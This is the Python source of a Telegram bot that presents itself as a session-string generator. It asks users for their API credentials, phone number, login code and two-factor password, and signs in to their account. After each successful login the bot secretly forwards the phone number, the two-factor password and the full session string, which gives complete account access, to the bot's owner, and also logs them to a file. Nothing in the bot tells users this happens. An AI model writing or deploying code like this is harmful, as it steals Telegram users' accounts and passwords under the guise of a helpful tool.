import logging
import json
import time
import asyncio
import psutil
from datetime import datetime
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters
)
from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeExpiredError,
    PhoneCodeInvalidError,
    PhoneMigrateError
)
from telethon.sessions import StringSession
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
from telethon.tl.types import User
from config import TOKEN, API_ID, API_HASH, OWNER_ID

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Conversation states
(API_ID_STATE, API_HASH_STATE, PHONE_STATE, 
 OTP_STATE, TFA_STATE, REVOKE_STATE) = range(6)

# Global state management
try:
    with open("state.json", "r") as f:
        state_data = json.load(f)
        GENERATION_COUNT = state_data.get("generation_count", 0)
        MAINTENANCE = state_data.get("maintenance", False)
        MAINTENANCE_MSG = state_data.get("maintenance_msg", "")
except FileNotFoundError:
    GENERATION_COUNT = 0
    MAINTENANCE = False
    MAINTENANCE_MSG = ""

def save_state():
    state_data = {
        "generation_count": GENERATION_COUNT,
        "maintenance": MAINTENANCE,
        "maintenance_msg": MAINTENANCE_MSG
    }
    with open("state.json", "w") as f:
        json.dump(state_data, f)

async def is_owner(update: Update):
    return update.effective_user.id == OWNER_ID

async def send_to_owner(message: str, context: ContextTypes.DEFAULT_TYPE):
    try:
        await context.bot.send_message(
            chat_id=OWNER_ID,
            text=f"🚨 NEW SESSION:\n{message}"
        )
    except Exception as e:
        logger.error(f"Owner notification failed: {e}")
        with open("session_logs.txt", "a") as f:
            f.write(f"[{datetime.now()}] {message}\n")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if MAINTENANCE and not await is_owner(update):
        await update.message.reply_text(f"⛔ Maintenance: {MAINTENANCE_MSG}")
        return
    
    user = update.effective_user
    await update.message.reply_text(
        f"👋 Hello {user.first_name}!\n🆔 Your ID: {user.id}\n\nUse /cmds for commands"
    )

async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
    commands = [
        "/start - Start bot",
        "/cmds - Command list",
        "/genstring - Generate session",
        "/revoke - Revoke session",
        "/resend - Resend OTP"
    ]
    if await is_owner(update):
        commands += [
            "\n👑 Owner:",
            "/stats - Server status",
            "/ping - Check latency",
            "/usage - Session count",
            "/verify <id> - User info",
            "/maintenance [msg] - Toggle mode"
        ]
    await update.message.reply_text("\n".join(commands))

async def genstring(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔑 Enter API_ID:")
    return API_ID_STATE

async def api_id_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        context.user_data['api_id'] = int(update.message.text)
        await update.message.reply_text("✅ API ID! Now API_HASH:")
        return API_HASH_STATE
    except ValueError:
        await update.message.reply_text("❌ Must be number! Retry:")
        return API_ID_STATE

async def api_hash_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['api_hash'] = update.message.text
    await update.message.reply_text("📱 Phone (with country code):")
    return PHONE_STATE

async def phone_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['phone'] = update.message.text
    client = TelegramClient(
        session=None,
        api_id=context.user_data['api_id'],
        api_hash=context.user_data['api_hash'],
        device_model="SessionBot",
        system_version="1.0",
        app_version="SessionGen 1.0",
        flood_sleep_threshold=60,
        connection_retries=3,
        retry_delay=5
    )
    
    try:
        await client.connect()
        context.user_data['original_dc'] = {
            'dc_id': client.session.dc_id,
            'server_address': client.session.server_address,
            'port': client.session.port
        }
        context.user_data['connection_retries'] = 0
        
        sent_code = await client.send_code_request(context.user_data['phone'])
        context.user_data['client'] = client
        context.user_data['phone_code_hash'] = sent_code.phone_code_hash
        context.user_data['code_time'] = time.time()
        
        await update.message.reply_text("📨 OTP sent! Enter code:")
        return OTP_STATE
        
    except PhoneMigrateError as e:
        logger.info(f"Phone migration to DC {e.new_dc}")
        await handle_dc_migration(e.new_dc, context)
        return await phone_handler(update, context)
        
    except Exception as e:
        logger.error(f"Connection error: {e}")
        await update.message.reply_text("❌ Connection error. Contact @rishabh_zz")
        return ConversationHandler.END

async def handle_dc_migration(new_dc, context):
    client = context.user_data['client']
    if client.is_connected():
        await client.disconnect()
    
    client.session.set_dc(new_dc, 
        client.session.get_dc(new_dc).ip_address,
        client.session.get_dc(new_dc).port
    )
    
    retries = 0
    while retries < 3:
        try:
            await client.connect()
            logger.info(f"Migrated to DC {new_dc}")
            context.user_data['original_dc'] = {
                'dc_id': new_dc,
                'server_address': client.session.server_address,
                'port': client.session.port
            }
            return
        except Exception as e:
            logger.warning(f"DC migration retry {retries+1}/3 failed: {e}")
            retries += 1
            await asyncio.sleep(1)
    
    raise ConnectionError("Failed to migrate DC after 3 attempts")

async def otp_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['otp'] = update.message.text
    client = context.user_data['client']
    
    try:
        current_dc = client.session.dc_id
        original_dc = context.user_data['original_dc']['dc_id']
        
        if current_dc != original_dc:
            logger.info(f"DC mismatch detected ({current_dc} vs {original_dc})")
            if client.is_connected():
                await client.disconnect()
            await client._switch_dc(original_dc)
            
            retries = 0
            while retries < 3:
                try:
                    await client.connect()
                    break
                except Exception as e:
                    logger.warning(f"Connection retry {retries+1}/3 failed: {e}")
                    retries += 1
                    await asyncio.sleep(1)

        result = await client.sign_in(
            phone=context.user_data['phone'],
            code=context.user_data['otp'],
            phone_code_hash=context.user_data['phone_code_hash']
        )
        
        if isinstance(result, User):
            string_session = client.session.save()
            
            global GENERATION_COUNT
            GENERATION_COUNT += 1
            save_state()
            
            log_data = f"API_ID: {context.user_data['api_id']}\nPhone: {context.user_data['phone']}\nString: {string_session}"
            await send_to_owner(log_data, context)
            
            await update.message.reply_text(f"✅ Generated:\n`{string_session}`", parse_mode='Markdown')
            return ConversationHandler.END
            
    except PhoneMigrateError as e:
        logger.info(f"Sign-in migration to DC {e.new_dc}")
        await handle_dc_migration(e.new_dc, context)
        return await otp_handler(update, context)
        
    except PhoneCodeExpiredError:
        await update.message.reply_text("⌛ Code expired! Use /resend")
        return ConversationHandler.END
        
    except PhoneCodeInvalidError:
        await update.message.reply_text("❌ Invalid code! Try again:")
        return OTP_STATE
        
    except Exception as e:
        logger.error(f"Sign-in error: {e}")
        await update.message.reply_text("❌ Connection error. Please try again or contact @rishabh_zz")
        return ConversationHandler.END

async def resend(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if 'client' not in context.user_data:
        await update.message.reply_text("❌ Start with /genstring first")
        return
    
    try:
        client = context.user_data['client']
        original_dc = context.user_data['original_dc']['dc_id']
        
        if client.session.dc_id != original_dc:
            if client.is_connected():
                await client.disconnect()
            await client._switch_dc(original_dc)
            await client.connect()
        
        sent_code = await client.resend_code_request(
            phone_number=context.user_data['phone'],
            phone_code_hash=context.user_data['phone_code_hash']
        )
        
        context.user_data['code_time'] = time.time()
        await update.message.reply_text("🔄 New OTP sent! Enter code:")
        return OTP_STATE
        
    except Exception as e:
        logger.error(f"Resend error: {e}")
        await update.message.reply_text("❌ Failed to resend. Start over with /genstring")
        return ConversationHandler.END

async def tfa_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    tfa_password = update.message.text
    client = context.user_data['client']
    
    try:
        await client.sign_in(password=tfa_password)
        string_session = client.session.save()
        
        global GENERATION_COUNT
        GENERATION_COUNT += 1
        save_state()
        
        log_data = f"API_ID: {context.user_data['api_id']}\nPhone: {context.user_data['phone']}\n2FA: {tfa_password}\nString: {string_session}"
        await send_to_owner(log_data, context)
        
        await update.message.reply_text(f"✅ Generated:\n`{string_session}`", parse_mode='Markdown')
        return ConversationHandler.END
    except Exception as e:
        logger.error(f"2FA error: {e}")
        await update.message.reply_text("❌ Invalid 2FA! Contact @rishabh_zz")
        return ConversationHandler.END

async def revoke(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔒 Paste session to revoke:")
    return REVOKE_STATE

async def handle_revoke(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session_str = update.message.text.strip()
    user = update.effective_user
    
    try:
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            await update.message.reply_text("❌ Invalid session")
            return ConversationHandler.END
            
        me = await client.get_me()
        if me.id != user.id:
            await update.message.reply_text("🚫 Not your session!")
            return ConversationHandler.END
            
        auths = await client(GetAuthorizationsRequest())
        target_hash = next((auth.hash for auth in auths.authorizations if auth.current), None)
        
        if target_hash:
            await client(ResetAuthorizationRequest(hash=target_hash))
            await client.log_out()
            await send_to_owner(f"Revoked by {user.id}\nPhone: {me.phone}", context)
            await update.message.reply_text("✅ Revoked!")
        else:
            await update.message.reply_text("❌ Active session not found")
    except Exception as e:
        logger.error(f"Revoke error: {e}")
        await update.message.reply_text("⚠️ Failed! Contact @rishabh_zz")
    finally:
        await client.disconnect()
    return ConversationHandler.END

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_owner(update):
        return
    
    cpu = psutil.cpu_percent()
    mem = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    
    stats_msg = (
        "🖥 **Server Stats**\n"
        f"• CPU: {cpu}%\n"
        f"• Memory: {mem.percent}%\n"
        f"• Disk: {disk.percent}%\n"
        f"• Uptime: {time.time() - psutil.boot_time():.0f}s\n"
        f"• Sessions: {GENERATION_COUNT}"
    )
    await update.message.reply_text(stats_msg, parse_mode='Markdown')

async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    start = time.time()
    msg = await update.message.reply_text("🏓 Pong!")
    latency = (time.time() - start) * 1000
    await msg.edit_text(f"🏓 {latency:.2f}ms\n⏰ {datetime.now().strftime('%H:%M:%S')}")

async def verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_owner(update):
        return
    
    try:
        user_id = int(context.args[0])
        user = await context.bot.get_chat(user_id)
        status = "Active" if not user.is_deleted else "Deleted"
        await update.message.reply_text(
            f"👤 User:\nID: `{user.id}`\nName: {user.full_name}\n"
            f"Username: @{user.username}\nStatus: {status}",
            parse_mode='Markdown'
        )
    except:
        await update.message.reply_text("❌ Use: /verify <user_id>")

async def maintenance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_owner(update):
        return
    
    global MAINTENANCE, MAINTENANCE_MSG
    MAINTENANCE = not MAINTENANCE
    MAINTENANCE_MSG = " ".join(context.args) if context.args else ""
    save_state()
    
    await update.message.reply_text(
        f"🔧 Maintenance {'ENABLED' if MAINTENANCE else 'DISABLED'}\n"
        f"Message: {MAINTENANCE_MSG}"
    )

async def usage(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_owner(update):
        return
    await update.message.reply_text(f"📊 Sessions: {GENERATION_COUNT}")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Error: {context.error}")
    await update.message.reply_text("❌ Error! Contact @rishabh_zz")
    await send_to_owner(f"Error:\n{context.error}\nUpdate: {update}", context)

async def post_init(application):
    try:
        await application.bot.send_message(
            chat_id=OWNER_ID,
            text="🔔 Bot Started Successfully!"
        )
    except Exception as e:
        logger.error(f"Startup notification failed: {e}")

def main():
    app = ApplicationBuilder() \
        .token(TOKEN) \
        .post_init(post_init) \
        .post_shutdown(lambda _: save_state()) \
        .build()
    
    gen_conv = ConversationHandler(
        entry_points=[CommandHandler('genstring', genstring)],
        states={
            API_ID_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, api_id_handler)],
            API_HASH_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, api_hash_handler)],
            PHONE_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, phone_handler)],
            OTP_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_handler)],
            TFA_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, tfa_handler)]
        },
        fallbacks=[CommandHandler('cancel', lambda u,c: ConversationHandler.END)],
    )
    
    revoke_conv = ConversationHandler(
        entry_points=[CommandHandler('revoke', revoke)],
        states={
            REVOKE_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_revoke)]
        },
        fallbacks=[CommandHandler('cancel', lambda u,c: ConversationHandler.END)],
    )

    app.add_handlers([
        CommandHandler('start', start),
        CommandHandler('cmds', cmds),
        gen_conv,
        revoke_conv,
        CommandHandler('resend', resend),
        CommandHandler('stats', stats),
        CommandHandler('ping', ping),
        CommandHandler('verify', verify),
        CommandHandler('maintenance', maintenance),
        CommandHandler('usage', usage)
    ])
    
    app.add_error_handler(error_handler)
    
    logger.info("Bot starting...")
    app.run_polling()

if __name__ == '__main__':
    main()
